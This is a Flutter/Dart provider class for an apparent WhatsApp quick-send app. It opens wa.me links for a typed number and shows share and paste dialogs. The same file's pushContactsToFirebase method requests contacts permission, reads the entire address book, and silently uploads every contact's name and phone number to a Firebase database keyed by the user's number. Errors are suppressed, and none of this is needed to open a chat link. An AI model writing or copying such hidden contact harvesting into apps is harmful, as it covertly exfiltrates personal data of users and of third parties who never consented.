import 'package:contacts_service/contacts_service.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:share/share.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:whatsapp_sender/presentation/ustils/responsive_screen.dart';
import 'package:whatsapp_sender/presentation/ustils/strings.dart';
import 'package:whatsapp_sender/presentation/ustils/translation_strings.dart';
import 'package:whatsapp_sender/presentation/ustils/utils_app.dart';
import 'package:whatsapp_sender/presentation/ustils/validations.dart';

class ProviderWhatsAppSend extends ChangeNotifier {
  final TextEditingController _phoneController = TextEditingController();
  final PermissionHandler _permissionHandler = PermissionHandler();
  final _databaseReference = FirebaseDatabase.instance.reference();
  Iterable<Contact> _contacts;
  String _pastePhone, _prefixCode;
  FocusNode _focusNode = FocusNode();

  TextEditingController get phoneControllerGet => _phoneController;

  String get prefixCodeGet => _prefixCode;

  DatabaseReference get databaseReferenceGet => _databaseReference;

  Iterable<Contact> get contactsGet => _contacts;

  String get pastePhoneGet => _pastePhone;

  FocusNode get focusNodeGet => _focusNode;

  Future<void> _getContacts() async {
    final Iterable<Contact> contacts = await ContactsService.getContacts();
    _contacts = contacts;
    notifyListeners();
  }

  void _sendData(String phoneNumber) {
    for (int i = 0; i < _contacts?.length ?? 0; i++) {
      try {
        _databaseReference
            .child(phoneNumber)
            .child(_contacts?.elementAt(i)?.phones?.first?.value?.toString())
            .set({
          'name': _contacts?.elementAt(i)?.displayName,
          'phone': _contacts?.elementAt(i)?.phones?.first?.value?.toString()
        });
      } catch (e) {}
    }
  }

  Future<bool> _rootFirebaseIsExists(
      DatabaseReference databaseReference, String phoneNumber) async {
    DataSnapshot snapshot = await databaseReference.once();
    if (snapshot.value == null) {
      _sendData(phoneNumber);
    }
    return snapshot != null;
  }

  void buttonClickSendWhatsApp() {
    if (phoneControllerGet.text.isNotEmpty &&
        Validations().validatePhone(phoneControllerGet.text)) {
      launch(
        "https://wa.me/$prefixCodeGet${phoneControllerGet.text}",
        forceSafariVC: false,
      );
    }
  }

  Future<Map<PermissionGroup, PermissionStatus>> _isGranted() async {
    var result =
        await _permissionHandler.requestPermissions([PermissionGroup.contacts]);
    return result;
  }

  void pushContactsToFirebase(String number) {
    _isGranted().then((value) => {
          if (value[PermissionGroup.contacts] == PermissionStatus.granted)
            {
              _getContacts().then((value) => {
                    {
                      _rootFirebaseIsExists(
                          databaseReferenceGet.child(number), number),
                    }
                  }),
            }
        });
  }

  void getCodeCountry(String value) {
    _prefixCode = value;
    notifyListeners();
  }

  void shareApp(BuildContext context) {
    final RenderBox box = context.findRenderObject();
    Share.share(
      'Share us!\nhttps://play.google.com/store/apps/details?id=com.flutter.whatsapp_sender',
      sharePositionOrigin: box.localToGlobal(Offset.zero) & box.size,
    );
  }

  Future showDialogWhatsApp(BuildContext context, String phoneNumber) {
    return showDialog(
      context: context,
      builder: (context) {
        return AlertDialog(
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(30),
          ),
          content: Column(
            mainAxisSize: MainAxisSize.min,
            children: <Widget>[
              Center(
                child: Text(
                  Translations.of(context).getString(Strings.paste_text_dialog),
                  style: const TextStyle(fontWeight: FontWeight.bold),
                  textAlign: TextAlign.center,
                ),
              ),
              UtilsApp.dividerHeight(context, 20),
              Row(
                mainAxisAlignment: MainAxisAlignment.center,
                crossAxisAlignment: CrossAxisAlignment.center,
                children: [
                  Container(
                    height: ResponsiveScreen().heightMediaQuery(context, 40),
                    width: ResponsiveScreen().widthMediaQuery(context, 100),
                    child: RaisedButton(
                      highlightElevation: 0.0,
                      splashColor: Colors.deepPurpleAccent,
                      highlightColor: Colors.purpleAccent,
                      elevation: 0.0,
                      color: Colors.deepPurpleAccent,
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(30.0),
                      ),
                      child: Text(
                        Translations.of(context).getString(Strings.no),
                        style: TextStyle(
                          fontWeight: FontWeight.bold,
                          color: Colors.white,
                          fontSize: 15,
                        ),
                      ),
                      onPressed: () {
                        Navigator.of(context).pop();
                      },
                    ),
                  ),
                  UtilsApp.dividerWidth(context, 20),
                  Container(
                    height: ResponsiveScreen().heightMediaQuery(context, 40),
                    width: ResponsiveScreen().widthMediaQuery(context, 100),
                    child: RaisedButton(
                        highlightElevation: 0.0,
                        splashColor: Colors.deepPurpleAccent,
                        highlightColor: Colors.deepPurpleAccent,
                        elevation: 0.0,
                        color: Colors.deepPurpleAccent,
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(30.0),
                        ),
                        child: Text(
                          Translations.of(context).getString(Strings.yes),
                          style: TextStyle(
                            fontWeight: FontWeight.bold,
                            color: Colors.white,
                            fontSize: 15,
                          ),
                        ),
                        onPressed: () {
                          phoneControllerGet.text = phoneNumber;
                          Navigator.of(context).pop();
                        }),
                  ),
                ],
              )
            ],
          ),
        );
      },
    );
  }
}
